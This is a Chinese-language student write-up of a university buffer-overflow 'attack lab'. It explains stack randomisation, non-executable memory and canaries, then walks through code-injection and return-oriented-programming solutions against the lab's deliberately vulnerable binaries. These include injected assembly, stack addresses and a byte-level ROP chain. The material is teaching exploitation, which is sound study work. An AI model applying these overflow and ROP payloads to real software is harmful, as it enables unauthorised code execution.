本实验为攻击安全漏洞实验，主要是为了深刻理解栈溢出可能带来的潜在危害及攻击方式

分为3个代码注入实验，2个ROP实验

有两种攻击方式，一种是注入攻击代码，另一种是return oriented programming (ROP)模式

对抗缓冲区溢出攻击的方式：

(1) 栈随机化，使攻击者不能得到正确的注入攻击代码的地址，进而阻止攻击
该方式可以通过nop sled(空操作雪橇)暴力破解，即一直空操作滑到攻击代码

(2) 限制可执行代码区域，该特性分离了内存的可读、可写、可执行功能，使的注入攻击代码方式不可行
但是仍然可以通过ROP方式攻击。即利用函数返回前的一些指令(称为gadget)，通过栈溢出将这些gadget以及需要的数据压入栈内，进而组合成攻击代码

(3)栈破坏检测
通过在栈内某一个位置存放一个随机值(称为金丝雀值或canary)， 来防止栈溢出，一旦该值被改变，与原值异或之后便不再为0， 直接结束程序。
这种方式使得ROP都不再有效，所以这里的代码(已经编译过的)，抑制了GCC这一特性，不然实验就没法继续了

Part I

Level 1: 使用objdump -d 可执行文件名，反汇编并输出到屏幕上或者重定向到某一个文件，查找touch1函数的地址，填到getbuf的返回地址即可
注意，实验指导文件末给出hex2raw文件可以将数字转化为字符，故而可以将对应的数字写入到一个文件，再经过hex2raw输出到另一个文件，作为测试函数的输入即可
cat ans1 | ./hex2raw | ./ctarget -q             // "|" 表示管道的意思

Level 2: 相较于Level 1， 这次不仅要写入touch2的地址， 还要传入cookie的值作为参数。由于只有一个参数故而将其写入%rdi，然后调用touch2，完成攻击任务
首先使用gdb查看一下getbuf的返回地址，gdb ctarget ---> break getbuf ---> r -q ---> info registers, %rsp对应的即为待返回的地址0x5561dca0。继续si几下就可得到输入时的栈顶地址0x5561dc78
接下来有两种选择，一种是在栈顶直接写注入的代码，将ret地址置为0x5561dc78
另一种是在ret之上写注入代码，这时将ret地址置为0x5561dca8
注入的代码：
movq $0x59b997fa, %rdi
pushq 0x4017ec
ret
用gcc汇编成目标代码，然后用objdump -d 反汇编即可得到数字表示，将数字表示写入一个文件，并在其他位置填补一些随意的数字(按照hex2raw的规则)即可。

Level 3
本题要求参数为一个字符串指针，考虑到写入栈内的字符串有可能被覆盖的风险，所以我们将字符串写入test栈帧，对应的地址传给%rdi， 然后调用touch3函数
首先是:
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
将上面的代码汇编成目标文件，再反汇编，将对应的数字写进答案文件ans3，然后填00 直到占了40个字节，然后在ret的位置写入栈顶位置，8个字节，再然后写入cookie字符串，结束

Part II

Level 2: 本题思路跟Part I里的Level 2类似，只不过这次执行的不再是注入的代码，而是一些gadget
首先找一下带pop的gadget， 选择一个合适的，写到ret地址内，在ret上面，写上cookie，由于该pop不能把cookie写入%rdi， 选择写入了%rax，故而我们需要一个gadget来movq %rax， %rdi
将这个地址写道rep + 16的地址上，然后程序会运行该gadget，程序返回后，会运行ret + 24里面的地址所指的指令，我们将touch2的函数地址放在ret + 24的地址上，完成。
前40个字节补00
cc 19 40 00     /* address for popq %rax from function getval_280 */
00 00 00 00
fa 97 b9 59     /* cookie address */
00 00 00 00
c5 19 40 00     /* address for movq %rax, %rdi the gadget from function getval_426 */
00 00 00 00
ec 17 40 00     /* touch2 function address */
00 00 00 00

Level 3: 考虑到要计算写入的cookie的地址，需要一个加法运算，但是farm.c汇编以后对应的反汇编又没有提供，但是仔细观察后发现在函数add_xy里提供了leaq (%rdi, %rsi, 1) %rax所以我们可以
相仿设法将%rsp及偏移地址分别放入%rdi， %rsi， 做一个加法运算，再movq %rax, %rdi然后调用touch3即可。具体可见ans5文件。

